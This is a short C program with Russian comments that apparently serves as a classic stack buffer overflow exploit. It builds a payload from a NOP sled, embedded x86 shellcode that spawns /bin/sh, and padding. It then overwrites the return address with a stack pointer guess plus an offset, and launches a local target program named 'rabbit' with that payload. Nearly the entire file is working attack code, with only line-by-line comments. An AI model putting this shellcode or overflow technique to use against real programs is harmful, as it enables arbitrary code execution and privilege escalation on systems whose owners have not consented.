#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#define DEFAULT_OFFSET 50
#define BUFFER_SIZE 256
#define SKIP_VARS 4
long get_esp(void) { // Получить указатель на стек
	__asm__("movl %esp,%eax\n");
}
void main() {
char *buff = NULL;
char *ptr = NULL;
int i;
/* Данный фрагмент выполняет вызов /bin/sh */
char execshell[] = "\xeb\x23\x5e\x8d\x1e\x89\x5e\x0b\x31\xd2\x89\x56\x07"
		"\x89\x56\x0f\x89\x56\x14\x88\x56\x19\x31\xc0\xb0\x3b"
		"\x8d\x4e\x0b\x89\xca\x52\x51\x53\x50\xeb\x18\xe8\xd8"
		"\xff\xff\xff/bin/sh\x01\x01\x01\x01\x02\x02\x02\x02"
		"\x03\x03\x03\x03\x9a\x04\x04\x04\x04\x07\x04";

buff = malloc(BUFFER_SIZE+16); // Выделяем память
if(!buff) {
	perror("Cannot allocate memory");
	exit(0);
}
ptr = buff;
/* Заполняем начало строки кодами команды NOP (нет операции) */
for (i=0; i < BUFFER_SIZE-strlen(execshell); i++)
	*(ptr++) = 0x90;
/* Теперь копируем в строку машинный код */
for (i=0; i < strlen(execshell); i++)
	*(ptr++) = execshell[i];
/* Пропускаем все, что лежит между буфером и адресом возврата */
for (i=0; i < SKIP_VARS; i++)
	*(ptr++) = 0x90;
/* Записываем адрес возврата */
*(long *)ptr = get_esp() + DEFAULT_OFFSET;
ptr += 4;
/* Завершающий 0 */
*ptr = 0;
/* Вызов программы с сформированной строкой в качестве аргумента */
printf("%s\n", buff);
	execl("./rabbit", "rabbit", buff, NULL);
}
